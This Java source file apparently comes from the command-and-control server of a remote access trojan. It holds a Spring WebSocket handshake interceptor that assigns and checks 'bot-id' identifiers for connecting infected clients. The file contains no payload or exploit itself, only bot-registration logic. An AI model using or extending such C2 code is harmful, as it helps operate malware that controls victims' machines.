package devs.alex.sah.rat.c2server.webSocket.bot;

import lombok.extern.slf4j.Slf4j;
import org.springframework.http.server.ServerHttpRequest;
import org.springframework.http.server.ServerHttpResponse;
import org.springframework.stereotype.Component;
import org.springframework.web.socket.WebSocketHandler;
import org.springframework.web.socket.server.HandshakeInterceptor;

import java.util.Map;
import java.util.UUID;

@Slf4j
@Component
public class BotHandshakeInterceptor implements HandshakeInterceptor {

    private final String SPECIFIED = "NEW_SP";
    private final int PREFIX_LENGTH = 6;

    private final String NEW = "NEW";

    @Override
    public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Map<String, Object> attributes) throws Exception {

        String botId;
        try {
            botId = request.getHeaders().get("bot-id").get(0);
        } catch (Exception exception) {
            log.debug("Failed to read \"bot-id\" header");
            return false;
        }

        if (botId.equals(NEW)) {
            botId = UUID.randomUUID().toString();
            log.debug("Generated new randomUUID");
        } else if (botId.startsWith(SPECIFIED)){
            if((botId.length() - PREFIX_LENGTH) >= 35){
                return false;
            }
            botId = botId.substring(PREFIX_LENGTH) + '-' + UUID.randomUUID().toString().substring(botId.length() - PREFIX_LENGTH, 35);
            log.debug("Generated new randomUUID for SPECIFIED bot: {}", botId);
        } else if (botId.length() < 36){
            log.debug("Received inappropriate id: {}", botId);
            return false;
        }
        attributes.put("botId", botId);
        response.getHeaders().add("bot-id", botId);
        return true;
    }

    @Override
    public void afterHandshake(ServerHttpRequest request, ServerHttpResponse response, WebSocketHandler wsHandler, Exception exception) { }
}
